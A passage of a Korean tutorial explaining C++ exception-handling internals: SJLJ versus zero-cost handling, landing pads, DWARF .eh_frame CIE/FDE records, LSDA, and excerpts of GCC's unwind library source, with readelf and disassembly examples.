std::terminate 함수를 호출하여 프로그램을 종료합니다.\nstd::string s = &quot;hello&quot;;try &#123;    s.substr(11);&#125; catch (const std::exception&amp; e) &#123;    std::cout &lt;&lt; e.what() &lt;&lt; &quot;\\n&quot;;  // basic_string::substr: __pos (which is 11) &gt; this-&gt;size() (which is 5)&#125;\nthrow 구문이 예외를 일으키면 프로그램은 호출 스택을 거슬러 올라가며 예외를 처리해줄 catch 블록을 검색합니다. 이 과정을 스택 되감기(stack unwinding)라고 합니다. 스택을 되감는 도중 예외가 발생한 지점과 catch 블록 사이의 코드에서 선언한 객체에 대해서는 자동으로 소멸자를 호출하도록 되어 있습니다. 이는 C++의 RAII(Resource Acquision is Initialization) 원칙을 따르기 위함입니다. RAII는 자원의 누수(leak)를 막기 위해 객체의 수명이 끝날 때 객체가 획득한 자원도 해제하도록 하는 원칙입니다. 예외가 발생한 경우 생성한 객체의 소멸자를 호출하는 코드에 도달할 수 없으므로 직접 호출해주는 것입니다.\n다음 그림이 나타내는 코드는 main 함수의 try 블록에서 func 함수를 호출합니다. func 함수는 MyClass 객체를 할당한 후 func2 함수를 호출하고, func2 함수 내에서 예외가 발생합니다. 보라색으로 표시한 코드는 스택을 되감는 부분으로, 스택을 한 번 되감은 후 func 함수가 할당한 MyClass 객채의 소멸자를 호출하고 있습니다.\n\n위의 내용을 코드로 나타내면 다음과 같습니다. 컴파일하고 실행하면 main 함수의 catch 블록에 도달하기 전 MyClass 객체의 소멸자가 호출되며 “destructor called.” 문자열을 출력합니다.\n#include &lt;stdio.h&gt;class MyClass &#123;public:    MyClass() &#123; printf(&quot;constructor called.\\n&quot;); &#125;    ~MyClass() &#123; printf(&quot;destructor called.\\n&quot;); &#125;&#125;;void func2(int n) &#123;    printf(&quot;n: %d\\n&quot;, n);    if (n == 0) &#123; throw 1; &#125;&#125;void func() &#123;    MyClass m;    printf(&quot;calling func2.\\n&quot;);    func2(0);&#125;int main() &#123;    try &#123;        printf(&quot;calling func.\\n&quot;);        func();    &#125; catch (const int&amp; e) &#123;        printf(&quot;catch block in main.\\n&quot;);    &#125;    return 0;&#125;\n$ g++ eh1.cc -o eh1 -no-pie$ ./eh1calling func.constructor called.calling func2.n: 0destructor called.catch block in main.\nSJLJ\ntry-catch 구문을 이용한 예외처리를 구현하기 위해서는 함수의 범위를 뛰어넘는(non-local) 분기를 사용해야 합니다. 예외가 발생하는 부분과 예외에 대응하는 catch 블록이 항상 같은 함수 내에 있다는 보장이 없기 때문입니다. 초기의 컴파일러들은 try-catch 구문을 setjmp , longjmp 라이브러리 함수를 이용하여 구현하였습니다. 이 방식을 SJLJ 방식이라 합니다.\nsetjmp 함수는 분기를 통해 실행 흐름이 돌아올 곳을 지정합니다. jmp_buf 타입을 인자로 받고, 최초 실행 시 jmp_buf 에 실행 환경(e.g. 스택 포인터, 인스트럭션 포인터 등)을 저장한 후 0을 반환합니다. longjmp 함수는 jmp_buf 타입과 정수형 값 val 을 인자로 받고, 실행 환경을 저장했던 위치로 흐름을 돌려 setjmp 함수를 호출합니다. 호출된 setjmp 함수는 val 을 반환합니다. 이전 문단의 예외 처리 예제를 setjmp , longjmp 함수로 작성하면 다음과 같습니다.\n#include &lt;stdio.h&gt;#include &lt;setjmp.h&gt;class MyClass &#123;public:    MyClass() &#123; printf(&quot;constructor called.\\n&quot;); &#125;    ~MyClass() &#123; printf(&quot;destructor called.\\n&quot;); &#125;&#125;;jmp_buf env;void func2(int n) &#123;    printf(&quot;n: %d\\n&quot;, n);    if (n == 0) &#123; longjmp(env, 1); &#125;&#125;void func() &#123;    MyClass m;    printf(&quot;calling func2.\\n&quot;);    func2(0);&#125;int main() &#123;    if (setjmp(env) == 0) &#123;                 // try        printf(&quot;calling func.\\n&quot;);        func();    &#125; else &#123;                                // catch        printf(&quot;catch block in main.\\n&quot;);    &#125;    return 0;&#125;\n$ ./eh2calling func.constructor called.calling func2.n: 0catch block in main.\n그런데 컴파일하고 실행하면 try-catch 구문을 사용하였을 때와는 다르게 MyClass 의 소멸자가 자동으로 호출되지 않습니다. setjmp 와 longjmp 함수는 단순히 분기만을 수행하기 때문입니다. 따라서 SJLJ 방식의 예외 처리에서 도중에 생성된 객체를 소멸시키기 위해서는 그림과 같이 스택을 하나 두고, 객체를 생성할 때마다 객체와 소멸자를 푸시하여야 합니다. 이후 예외를 발생시킬 때 스택을 순회하며 소멸자를 호출한 후 longjmp 함수를 호출해야 합니다.\n\nZero-cost 예외 처리\nSJLJ 방식의 예외 처리는 구현이 단순하지만 예외가 발생하지 않는 상황에서도 오버헤드를 강제한다는 단점이 있습니다. try 블록 하나 당 스택과 jmp_buf 가 하나씩 필요하며, 예외 발생 여부와 관계없이 객체를 생성할 때마다 푸시와 팝을 반복해야 하기 때문입니다. 이 경우 복잡한 프로그램에서는 예외 처리를 사용하는 것만으로 적지 않은 성능 저하를 일으킬 수 있습니다.\n인텔(Intel) 사는 2001년 아이테니엄(Itanium, IA-64) 아키텍처를 설계하면서 예외가 없으면 오버헤드도 없는 예외 처리 방식을 제안하였습니다. 이 방식을 zero-cost 예외 처리(zero-cost exception handling)이라고 합니다. 새로운 방식은 컴파일러 개발자들에 의해 채택되어 다른 아키텍처로도 포팅되었고, 지금은 일반적으로 컴파일을 수행하면 기본값으로 적용하는 표준 방식이 되었습니다. Zero-cost 예외 처리의 구현을 살펴보기 위해서는 먼저 랜딩 패드의 개념을 이해해야 합니다.\n랜딩 패드(landing pad)는 프로그램 코드의 일부로, 예외가 발생했을 때 대응하거나 객체의 자원 할당을 해제하는 등의 cleanup 작업을 위한 부분입니다. 앞서 컴파일한 eh1 바이너리에는 두 개의 랜딩 패드가 존재합니다. func 함수의 MyClass 객체를 소멸시키는 코드와 main 함수의 catch 블록입니다. func 함수의 그래프를 보면 보라색 블록과 같이 실행 흐름과 동떨어진 코드가 있습니다. 이 코드가 바로 MyClass 객체의 소멸자를 호출하는 랜딩 패드입니다.\n\nmain 함수의 그래프에서도 보라색 블록으로 나타낸, 문자열을 출력하고 0을 반환하는 블록으로 이어지는 코드가 있습니다. 이 코드 또한 랜딩 패드이며, 소스 코드 상에서 catch 블록에 해당합니다. 예외가 발생하면 스택 되감기를 수행하면서 func 함수의 랜딩 패드와 main 함수의 랜딩 패드를 순서대로 방문하게 됩니다. 전자는 소멸자 호출 후 _Unwind_Resume 함수를 호출하여 스택 되감기를 계속하지만, 후자는 스택 되감기를 마치고 실행 흐름으로 돌아온다는 차이가 있습니다.\n\n앞서 try-catch 구문을 사용하면 호출 스택의 중간에서 생성된 객체는 자동으로 소멸자를 호출한다고 하였습니다. 이는 사실 컴파일러가 소멸자 호출이 필요한 함수에 미리 랜딩 패드를 준비하고, 스택 되감기 과정에서 랜딩 패드를 순서대로 방문하도록 하기 때문입니다. 그런데 어떻게 프로그램이 setjmp , longjmp 함수를 사용하지 않고도 실행 흐름을 되돌리고, 랜딩 패드를 찾아서 방문할 수 있을까요? Zero-cost 예외 처리 방식의 내부 원리에 대해 더 깊이 살펴보겠습니다.\nDWARF CFI\n프로그램이 setjmp , longjmp 함수 없이도 실행 흐름을 돌릴 수 있는 이유는 바이너리의 디버그 데이터에 스택 되감기에 필요한 정보가 인코딩되어있기 때문입니다. DWARF는 ELF 실행 파일을 위한 디버그 데이터 형식으로 소스 코드 수준의 디버깅을 위한 다양한 정보를 제공하고 있습니다. 이 중 호출 프레임 정보(call frame information)가 기록된 .eh_frame 섹션이 바로 스택 되감기에 필요한 부분입니다.\n일반적으로 함수를 호출할 때 리턴 주소를 스택에 푸시합니다. 이후 함수 프롤로그에서 이전 함수의 프레임 포인터를 푸시하고, 값을 보존해야 할 레지스터들이 있다면 추가로 푸시합니다. 그렇기 때문에 그림과 같이 스택에서 특정 주소를 기준으로 조사하면 이전 함수의 인스트럭션 포인터, 프레임 포인터, 레지스터 값들을 모두 알아낼 수 있습니다. 이 때 기준이 되는 주소를 CFA(cannonical frame address)라고 하며, 보통 함수를 호출하기 직전의 스택 포인터를 CFA로 정의합니다.\n\n이전 함수의 프레임에서 사용하는 값을 모두 복원할 수 있다면 스택을 되감을 수 있습니다. .eh_frame 섹션은 이를 위해 개념적으로 다음과 같은 호출 프레임 테이블을 준비합니다.\nLOC CFA R0  R1  ... RNL0L1...LN\n테이블에서 LOC 열은 코드 영역의 모든 주소를 나타냅니다. CFA 열은 해당 주소의 코드 문맥에서 CFA를 어떻게 계산하는지 나타냅니다. (e.g. RSP + 8) R1, … , RN 열은 아키텍처의 범용 레지스터들에 대응하며, 이전 프레임에서 사용 중이던 해당 레지스터의 값이 CFA를 기준으로 어디에 대응하는지 나타냅니다. (e.g. *(CFA - 24)) 즉, 이 테이블은 코드 상의 모든 주소에서 이전 함수로 스택을 되감을 수 있도록 필요한 정보를 제공하고 있는 것입니다.\n그런데 실제로 모든 주소에 대한 호출 프레임 테이블을 인코딩한다면 바이너리에서 프로그램 코드보다 테이블이 차지하는 비중이 너무 많아 용량이 상당히 커질 것입니다. 따라서 .eh_frame 섹션은 사실 테이블이 아니라 테이블의 특정 행을 어떻게 구성해야 하는지 지시하는 바이트코드로 되어 있습니다. 이 바이트코드는 호출 프레임 인스트럭션(call frame instruction)이라는 별도의 형식을 갖고 있으며, CIE(common information entry)와 FDE(frame description entry)라는 구조체에 나누어 저장되어 있습니다. 런타임에서는 예외가 발생한 주소에 해당하는 CIE와 FDE를 찾은 후 바이트코드가 지시하는 대로 이전 프레임에서 사용하는 값들을 복원하면서 호출 스택을 한 단계씩 되감습니다.\nCIE와 FDE\nCIE와 FDE는 이전 프레임의 값들을 복원하기 위한 호출 프레임 인스트럭션들을 비롯하여 여러 가지 정보가 저장된 구조체입니다. CIE는 여러 개의 FDE에서 공통적으로 사용하는 정보을 포함하고 있으며, CIE의 인스트럭션은 FDE의 인스트럭션을 실행하기 전 먼저 실행됩니다. FDE는 특정 함수와 같이 제한적인 주소 범위에서만 유효한 정보를 포함하고 있습니다. CIE의 내용 중 중요한 필드들을 나열하면 다음과 같습니다.\n\nCIE_id\n\nCIE의 식별자입니다.\n\n\naugmentation\n\n스택 되감기에 있어 특정 프로그래밍 언어에서 요구하는 내용이 있는지 나타냅니다. 예외 처리와 관련된 내용으로는 personality 루틴의 존재 여부와 LSDA의 위치를 포함하고 있는데, 후술합니다.\n\n\nreturn_address_register\n\n테이블의 R1, … , RN 중 어떤 레지스터의 값이 해당 프레임에서 리턴 주소에 해당하는지 나타냅니다.\n\n\ncode_alignment_factor\n\n테이블의 행에 해당하는 코드 주소를 계산하기 위해 주어진 오프셋에 곱하는 상수 값인데, 후술합니다.\n\n\ndata_alignment_factor\n\n스택에서 CFA를 기준으로 특정 주소에 접근하기 위해 주어진 오프셋에 곱하는 상수 값인데, 후술합니다.\n\n\ninitial_instructions\n\n테이블의 행을 구성하기 위해 가장 먼저 수행해야 하는 호출 프레임 인스트럭션들입니다.\n\n\n\nFDE의 내용 중 중요한 필드들은 다음과 같습니다.\n\nCIE_pointer\n\n이 FDE가 종속된 CIE를 가리킵니다.\n\n\ninitial_location\n\n테이블에서 이 FDE가 나타내는 행들의 시작 주소를 가리킵니다.\n\n\naddress_range\n\nFDE가 나타내는 행들이 시작 주소로부터 몇 바이트만큼 떨어진 주소까지 유효한지 나타냅니다.\n\n\ninstructions\n\n테이블의 행을 구성하기 위해 수행하는 호출 프레임 인스트럭션들입니다.\n\n\n\n즉, .eh_frame 섹션에서 CIE와 FDE들의 관계는 그림과 같습니다.\n\n호출 프레임 인스트럭션\n호출 프레임 인스트럭션은 특정 주소의 코드에서 이전 프레임을 복원하여 스택을 되감을 수 있는 방법을 지시하는 바이트코드 형식입니다. 일반적으로 CIE에서 CFA와 리턴 주소를 복원하고, FDE에서 프레임 포인터와 같은 나머지 범용 레지스터를 복원합니다. 자주 사용되는 호출 프레임 인스트럭션들은 다음과 같습니다.\n\nDW_CFA_def_cfa\n\n레지스터 RN 과 오프셋 offset 을 받아, CFA를 RN + offset 으로 정의합니다.\n\n\nDW_CFA_def_cfa_offset\n\n오프셋 offset 을 받아, CFA를 RN + offset 으로 다시 정의합니다. (RN 은 기존 값을 사용합니다)\n\n\nDW_CFA_def_cfa_register\n\n레지스터 RN 을 받아, CFA를 RN + offset 으로 다시 정의합니다. (offset 은 기존 값을 사용합니다)\n\n\nDW_advance_loc\n\n상수 delta 를 받아, 코드 주소 initial_location + delta * code_alignment_factor 에 해당하는 새로운 테이블 행을 추가합니다.\n\n\nDW_CFA_offset\n\n레지스터 RN 과 오프셋 offset 을 받아, RN 을 주소 CFA + offset * data_alignment_factor 의 값으로 복원합니다.\n\n\n\nCIE와 FDE에 저장된 호출 프레임 인스트럭션을 readelf 커맨드로 읽기 쉽게 출력할 수 있습니다. readelf 에 --debug-dump=frames 옵션을 주어 eh1 바이너리의 호출 프레임 인스트럭션을 확인해 보겠습니다.\n$ readelf --debug-dump=frames eh1Contents of the .eh_frame section:00000000 0000000000000014 00000000 CIE  Version:               1  Augmentation:          &quot;zR&quot;  Code alignment factor: 1  Data alignment factor: -8  Return address column: 16  Augmentation data:     1b  DW_CFA_def_cfa: r7 (rsp) ofs 8  DW_CFA_offset: r16 (rip) at cfa-8  DW_CFA_nop  DW_CFA_nop00000018 0000000000000010 0000001c FDE cie=00000000 pc=0000000000401130..000000000040115f  DW_CFA_advance_loc: 4 to 0000000000401134  DW_CFA_undefined: r16 (rip)...\nCIE_id 가 00000000 인 CIE의 각종 필드와 인스트럭션, 그리고 이 CIE에 종속된 FDE들의 인스트럭션들을 확인할 수 있습니다. CIE의 인스트럭션들은 DW_CFA_def_cfa 로 CFA를 정의하고 DW_CFA_offset 으로 R16 (rip)을 복원합니다. return_address_register 필드가 16이므로 복원한 R16이 이 프레임의 리턴 주소임을 알 수 있습니다.\nfunc2 함수의 주소 범위에 대한 FDE를 살펴보며 호출 프레임 인스트럭션을 분석해 보겠습니다. func 함수는 주소 0x401216 에 위치하며, 함수 프롤로그에서 이전 함수의 rbp 값을 스택에 푸시합니다.\npwndbg&gt; disass func2Dump of assembler code for function func2(int):   0x0000000000401216 &lt;+0&gt;: endbr64   0x000000000040121a &lt;+4&gt;: push   rbp   0x000000000040121b &lt;+5&gt;: mov    rbp,rsp   0x000000000040121e &lt;+8&gt;: sub    rsp,0x10   ...   0x0000000000401266 &lt;+80&gt;:    leave   0x0000000000401267 &lt;+81&gt;:    ret\ngrep 을 사용하여 readelf 커맨드의 결과로부터 주소 401216 부터 시작하는 FDE를 검색합니다. pc=0000000000401216..0000000000401268 에서 이 FDE가 func2 함수의 주소 범위에 대응하는 엔트리임을 알 수 있으며, cie=00000000 에서 CIE_id 가 00000000 인 CIE에 종속됨을 알 수 있습니다.\n$ readelf --debug-dump=frames eh1 | grep 401216 -A 10000000e4 000000000000001c 000000e8 FDE cie=00000000 pc=0000000000401216..0000000000401268  DW_CFA_advance_loc: 5 to 000000000040121b  DW_CFA_def_cfa_offset: 16  DW_CFA_offset: r6 (rbp) at cfa-16  DW_CFA_advance_loc: 3 to 000000000040121e  DW_CFA_def_cfa_register: r6 (rbp)  DW_CFA_advance_loc1: 73 to 0000000000401267  DW_CFA_def_cfa: r7 (rsp) ofs 8  DW_CFA_nop  DW_CFA_nop\nFDE의 인스트럭션들을 보면 DW_CFA_advance_loc 을 통해 새로운 행을 만들고, DW_CFA_def_cfa_offset 등으로 CFA를 재정의하고 있습니다. 이는 해당 주소에서 mov rbp,rsp , sub rsp,0x10 와 같은 코드가 실행되어 CIE에서 CFA 계산의 기준이 되었던 rsp 의 값이 계속 바뀌기 때문입니다. func2 함수에 대해 CIE와 FDE의 인스트럭션을 종합하여 스택 되감기를 위한 테이블로 나타내면 다음과 같습니다.\n\nLSDA\n바이너리의 .eh_frame 섹션에 있는 CIE와 FDE를 참조하여 스택 되감기가 가능함을 확인하였습니다. 그런데 예외 처리를 위해서는 예외가 발생하였을 때 단순히 리턴 주소로 돌아가는 것이 아니라, 실행 흐름을 호출 스택 상에서 가장 가까운 랜딩 패드로 정확히 돌려야 합니다. 스택 되감기 이후에 추가적인 작업이 필요한 것입니다.\n런타임에서 예외 발생 후 스택 되감기를 수행하고 나면, C++ 라이브러리에 구현된 함수가 개입하여 발생한 예외에 해당하는 랜딩 패드로 실행 흐름을 옮깁니다. 이 함수와 같이 특정 언어만의 예외 처리를 위해 제공된 함수를 personality 루틴이라고 합니다. Personality 루틴은 LSDA(language specific data area)라는 영역에 위치한 여러 가지 정보를 해석하여 적절한 랜딩 패드의 위치를 찾아냅니다. g++ 컴파일러로 컴파일된 바이너리에서 LSDA는 .gcc_except_table 섹션에 위치합니다.\nC++ 소스 코드상에서 각각의 함수는 서로 다른 LSDA를 가집니다. LSDA는 헤더와 call-site 테이블, 액션 테이블로 이루어져 있습니다. Personality 루틴은 LSDA 헤더를 읽어 함수 코드 내에서 랜딩 패드의 시작 오프셋을 얻습니다. 그리고 call-site 테이블에서 예외가 발생한 주소에 해당하는 레코드를 찾아 랜딩 패드 내에서 분기해야 할 최종 오프셋을 얻으며, action 테이블에서 해당하는 레코드의 오프셋을 얻어 실행 흐름을 돌릴 목적지가 catch 블록인지 cleanup 코드인지 구별합니다.\nItanium C++ ABI\n런타임에 실제로 스택 되감기와 예외 처리를 수행하는 로직은 인텔이 제안한 아이테니엄 C++ ABI의 예외 처리 부분을 구현한 라이브러리 함수들입니다. 아이테니엄 C++ ABI는 스택 되감기를 구현하는 unwind 라이브러리와, unwind 라이브러리를 기반으로 예외 처리 구현을 위해 작성된 C++ ABI로 구성되어 있습니다. Unwind 라이브러리와 C++ ABI의 소스 코드는 각각 GCC 프로젝트의 libgcc , libstdc++-v3 경로에 위치합니다.\nGitHub - gcc-mirror/gccContribute to gcc-mirror/gcc development by creating an account on GitHub.GitHub\nUnwind 라이브러리\nUnwind 라이브러리에서 스택 되감기는 예외를 발생시키는 것으로 시작합니다. 예외 발생 시 예외 구조체가 전달되며, 라이브러리에서는 이를 다음의 두 단계에 걸쳐 처리합니다.\n\nsearch 단계\n\n스택을 계속 되감으면서 personality 루틴을 반복하여 호출합니다. Personality 루틴이 랜딩 패드를 찾으면 성공하며, 찾지 못할 경우 예외 처리에 실패합니다. 이 단계는 스택을 되감으면서 각 프레임의 내용을 참조하지만, 실제로 실행 흐름까지 되돌리지는 않습니다.\n\n\ncleanup 단계\n\n다시 스택을 되감으면서 personality 루틴을 반복하여 호출합니다. 랜딩 패드를 찾는 순간 레지스터 값들을 복원하여 실행 흐름을 랜딩 패드로 옮깁니다.\n\n\n\nUnwind 라이브러리에서 사용하는 중요한 구조체로는 _Unwind_Exception 과 _Unwind_Context 가 있습니다. _Unwind_Exception 는 발생한 예외를 나타내는 구조체입니다. 구조체에서 exception_class 필드는 예외를 발생시킨 프로그래밍 언어와 구현체에 대한 정보를 나타내며, C++ 예외는 하위 4바이트가 &quot;C++\\0&quot; 로 되어 있습니다. 나머지 필드는 Java와 같은 외부 언어에서 발생한 예외와 관련된 필드입니다.\n/* The unwind interface uses a pointer to an exception header object   as its representation of an exception being thrown. In general, the   full representation of an exception object is language- and   implementation-specific, but it will be prefixed by a header   understood by the unwind interface.  */struct _Unwind_Exception&#123;  _Unwind_Exception_Class exception_class;  _Unwind_Exception_Cleanup_Fn exception_cleanup;#if !defined (__USING_SJLJ_EXCEPTIONS__) &amp;&amp; defined (__SEH__)  _Unwind_Word private_[6];#else  _Unwind_Word private_1;  _Unwind_Word private_2;#endif  /* @@@ The IA-64 ABI says that this structure must be double-word aligned.     Taking that literally does not make much sense generically.  Instead we     provide the maximum alignment required by any type for the machine.  */&#125; __attribute__((__aligned__));\n_Unwind_Context 는 특정 프레임에서 레지스터들의 값과 CFA, 리턴 주소 등 스택 되감기를 위해 필요한 정보들을 나타내는 구조체입니다. reg 배열은 호출 프레임 테이블에서 R1, … , R16 레지스터의 값에 해당합니다. cfa 와 ra 필드는 각각 CFA와 리턴 주소를 가리킵니다. lsda 필드에는 런타임에 LSDA의 주소를 찾아 대입합니다.\n/* This is the register and unwind state for a particular frame.  This   provides the information necessary to unwind up past a frame and return   to its caller.  */struct _Unwind_Context &#123;    _Unwind_Context_Reg_Val reg[__LIBGCC_DWARF_FRAME_REGISTERS__ + 1];    void *cfa;    void *ra;    void *lsda;    struct dwarf_eh_bases bases;    /* Signal frame context.  */#define SIGNAL_FRAME_BIT ((~(_Unwind_Word)0 &gt;&gt; 1) + 1)    /* Context which has version/args_size/by_value fields.  */#define EXTENDED_CONTEXT_BIT ((~(_Unwind_Word)0 &gt;&gt; 2) + 1)    /* Bit reserved on AArch64, return address has been signed with A or B       key.  */#define RA_SIGNED_BIT ((~(_Unwind_Word)0 &gt;&gt; 3) + 1)    _Unwind_Word flags;    /* 0 for now, can be increased when further fields are added to       struct _Unwind_Context.  */    _Unwind_Word version;    _Unwind_Word args_size;    char by_value[__LIBGCC_DWARF_FRAME_REGISTERS__ + 1];&#125;;\n이외에도 CIE와 FDE의 인스트럭션을 해석하여 구성한 호출 프레임 테이블의 행을 나타내는 _Unwind_FrameState 구조체가 있습니다. 아래 정의에서 reg 배열은 R1, … , RN 레지스터들의 값을 복원해야 하는지, 복원한다면 CFA와 오프셋을 기준으로 복원하는지, 다른 레지스터의 값으로 복원하는지 등의 방법을 나타냅니다. cfa_offset 과 cfa_reg 필드는 CFA를 정의하는 레지스터와 오프셋을 나타냅니다. personality 필드에는 런타임에 CIE의 augmentation 필드를 읽고 personality 루틴의 주소를 대입합니다.\n/* The result of interpreting the frame unwind info for a frame.   This is all symbolic at this point, as none of the values can   be resolved until the target pc is located.  */typedef struct&#123;  /* Each register save state can be described in terms of a CFA slot,     another register, or a location expression.  */  struct frame_state_reg_info  &#123;    struct &#123;      union &#123;\t_Unwind_Word reg;\t_Unwind_Sword offset;\tconst unsigned char *exp;      &#125; loc;      enum &#123;\tREG_UNSAVED,\tREG_SAVED_OFFSET,\tREG_SAVED_REG,\tREG_SAVED_EXP,\tREG_SAVED_VAL_OFFSET,\tREG_SAVED_VAL_EXP,\tREG_UNDEFINED      &#125; how;    &#125; reg[__LIBGCC_DWARF_FRAME_REGISTERS__+1];    /* Used to implement DW_CFA_remember_state.  */    struct frame_state_reg_info *prev;    /* The CFA can be described in terms of a reg+offset or a       location expression.  */    _Unwind_Sword cfa_offset;    _Unwind_Word cfa_reg;    const unsigned char *cfa_exp;    enum &#123;      CFA_UNSET,      CFA_REG_OFFSET,      CFA_EXP    &#125; cfa_how;  &#125; regs;  /* The PC described by the current frame state.  */  void *pc;  /* The information we care about from the CIE/FDE.  */  _Unwind_Personality_Fn personality;  _Unwind_Sword data_align;  _Unwind_Word code_align;  _Unwind_Word retaddr_column;  unsigned char fde_encoding;  unsigned char lsda_encoding;  unsigned char saw_z;  unsigned char signal_frame;  void *eh_ptr;&#125; _Unwind_FrameState;\n이제 Unwind 라이브러리에서 예외를 처리하는 함수들이 어떻게 구현되어 있는지 살펴보겠습니다. 라이브러리에서 반환값이 있는 대부분의 함수는 _Unwind_Reason_Code 열거형을 반환합니다. 각각의 값들은 합수의 성공 및 실패 여부, 스택 되감기를 계속 수행해야 하는지 등을 나타냅니다.\n/* The unwind interface uses reason codes in several contexts to   identify the reasons for failures or other actions.  */typedef enum&#123;  _URC_NO_REASON = 0,  _URC_FOREIGN_EXCEPTION_CAUGHT = 1,  _URC_FATAL_PHASE2_ERROR = 2,  _URC_FATAL_PHASE1_ERROR = 3,  _URC_NORMAL_STOP = 4,  _URC_END_OF_STACK = 5,  _URC_HANDLER_FOUND = 6,  _URC_INSTALL_CONTEXT = 7,  _URC_CONTINUE_UNWIND = 8&#125; _Unwind_Reason_Code;\n_Unwind_RaiseException 함수는 _Unwind_Exception 구조체를 받아 예외를 일으키는 함수입니다. 10행은 this_context 와 cur_context 를 현재 스택 프레임의 내용으로 초기화합니다. 15행은 search 단계에 해당하는 반복문으로, personality 루틴이 랜딩 패드를 찾아낸 경우에만 탈출할 수 있습니다. 20행은 cur_context 프레임에 해당하는 CIE와 FDE를 읽고 _Unwind_FrameState 구조체 fs 를 초기화하는 내장 함수를 호출합니다. 32행은 personality 루틴이 있다면 호출합니다. 42행은 fs 를 반영하여 cur_context 가 이전 프레임의 내용을 나타내도록 합니다.\n반복문 이후는 cleanup 단계를 수행하고 실행 흐름을 되돌리는 부분입니다. 51행은 _Unwind_RaiseException_Phase2 함수를 호출하여 cleanup 단계를 수행합니다. 이 함수가 반환하면 cur_context 는 실행 흐름을 옮길 랜딩 패드의 내용을, frames 변수는 되감아야 할 스택 프레임의 개수를 나타내게 됩니다. 55행은 cur_context 의 내용을 실제 레지스터에 반영하여 실행 흐름을 옮기는 매크로를 호출합니다. 따라서 랜딩 패드를 찾지 못하는 등의 실패가 발생하지 않는 이상 _Unwind_RaiseException 함수는 반환하지 않으며, 랜딩 패드로 곧바로 분기하여 실행 흐름을 이어갑니다.\n/* Raise an exception, passing along the given exception object.  */_Unwind_Reason_Code LIBGCC2_UNWIND_ATTRIBUTE_Unwind_RaiseException(struct _Unwind_Exception *exc) &#123;    struct _Unwind_Context this_context, cur_context;    _Unwind_Reason_Code code;    unsigned long frames;    /* Set up this_context to describe the current stack frame.  */    uw_init_context(&amp;this_context);    cur_context = this_context;    /* Phase 1: Search.  Unwind the stack, calling the personality routine       with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */    while (1) &#123;        _Unwind_FrameState fs;        /* Set up fs to describe the FDE for the caller of cur_context.  The       first time through the loop, that means __cxa_throw.  */        code = uw_frame_state_for(&amp;cur_context, &amp;fs);        if (code == _URC_END_OF_STACK)            /* Hit end of stack with no handler found.  */            return _URC_END_OF_STACK;        if (code != _URC_NO_REASON)            /* Some error encountered.  Usually the unwinder doesn&#x27;t               diagnose these and merely crashes.  */            return _URC_FATAL_PHASE1_ERROR;        /* Unwind successful.  Run the personality routine, if any.  */        if (fs.personality) &#123;            code = (*fs.personality)(1, _UA_SEARCH_PHASE, exc-&gt;exception_class,                                     exc, &amp;cur_context);            if (code == _URC_HANDLER_FOUND)                break;            else if (code != _URC_CONTINUE_UNWIND)                return _URC_FATAL_PHASE1_ERROR;        &#125;        /* Update cur_context to describe the same frame as fs.  */        uw_update_context(&amp;cur_context, &amp;fs);    &#125;    /* Indicate to _Unwind_Resume and associated subroutines that this       is not a forced unwind.  Further, note where we found a handler.  */    exc-&gt;private_1 = 0;    exc-&gt;private_2 = uw_identify_context(&amp;cur_context);    cur_context = this_context;    code = _Unwind_RaiseException_Phase2(exc, &amp;cur_context, &amp;frames);    if (code != _URC_INSTALL_CONTEXT)        return code;    uw_install_context(&amp;this_context, &amp;cur_context, frames);&#125;\nuw_frame_state_for 내장 함수는 _Unwind_Context 구조체 context 를 받아 프레임에 해당하는 CIE와 FDE의 호출 프레임 인스트럭션을 해석하여 _Unwind_FrameState 구조체 fs 를 초기화합니다. 19행과 34행에서 CIE와 FDE의 주소를 찾고, 35행에서 extract_cie_info 내장 함수를 호출하여 CIE의 필드를 읽고 fs 구조체에서 해당하는 값들을 초기화합니다. fs 의 personality 필드는 이 함수 내에서 초기화됩니다. 이후 42행과 64행에서 execute_cfa_program 내장 함수를 호출하여 호출 프레임 인스트럭션을 해석하고 CFA 및 레지스터들과 관련된 내용을 초기화합니다.\n/* Given the _Unwind_Context CONTEXT for a stack frame, look up the FDE for   its caller and decode it into FS.  This function also sets the   args_size and lsda members of CONTEXT, as they are really information   about the caller&#x27;s frame.  */static _Unwind_Reason_Codeuw_frame_state_for(struct _Unwind_Context *context, _Unwind_FrameState *fs) &#123;    const struct dwarf_fde *fde;    const struct dwarf_cie *cie;    const unsigned char *aug, *insn, *end;    memset(fs, 0, sizeof(*fs));    context-&gt;args_size = 0;    context-&gt;lsda = 0;    if (context-&gt;ra == 0)        return _URC_END_OF_STACK;    fde = _Unwind_Find_FDE(context-&gt;ra + _Unwind_IsSignalFrame(context) - 1,                           &amp;context-&gt;bases);    if (fde == NULL) &#123;#ifdef MD_FALLBACK_FRAME_STATE_FOR        /* Couldn&#x27;t find frame unwind info for this function.  Try a       target-specific fallback mechanism.  This will necessarily       not provide a personality routine or LSDA.  */        return MD_FALLBACK_FRAME_STATE_FOR(context, fs);#else        return _URC_END_OF_STACK;#endif    &#125;    fs-&gt;pc = context-&gt;bases.func;    cie = get_cie(fde);    insn = extract_cie_info(cie, context, fs);    if (insn == NULL)        /* CIE contained unknown augmentation.  */        return _URC_FATAL_PHASE1_ERROR;    /* First decode all the insns in the CIE.  */    end = (const unsigned char *)next_fde((const struct dwarf_fde *)cie);    execute_cfa_program(insn, end, context, fs);    /* Locate augmentation for the fde.  */    aug = (const unsigned char *)fde + sizeof(*fde);    aug += 2 * size_of_encoded_value(fs-&gt;fde_encoding);    insn = NULL;    if (fs-&gt;saw_z) &#123;        _uleb128_t i;        aug = read_uleb128(aug, &amp;i);        insn = aug + i;    &#125;    if (fs-&gt;lsda_encoding != DW_EH_PE_omit) &#123;        _Unwind_Ptr lsda;        aug = read_encoded_value(context, fs-&gt;lsda_encoding, aug, &amp;lsda);        context-&gt;lsda = (void *)lsda;    &#125;    /* Then the insns in the FDE up to our target PC.  */    if (insn == NULL)        insn = aug;    end = (const unsigned char *)next_fde(fde);    execute_cfa_program(insn, end, context, fs);    return _URC_NO_REASON;&#125;\n_Unwind_RaiseException_Phase2 함수는 cleanup 단계를 분리하여 작성한 함수입니다. 전반적인 로직은 호출자인 _Unwind_RaiseException 함수와 거의 동일합니다. frames 변수를 통해 되감을 스택 프레임의 개수를 세고, personality 루틴을 호출할 때 _UA_CLEANUP_PHASE 플래그를 전달하여 cleanup 단계임을 알 수 있도록 하는 차이가 있습니다. Personality 루틴이 랜딩 패드를 찾아 _URC_INSTALL_CONTEXT 코드를 반환하면 반복문을 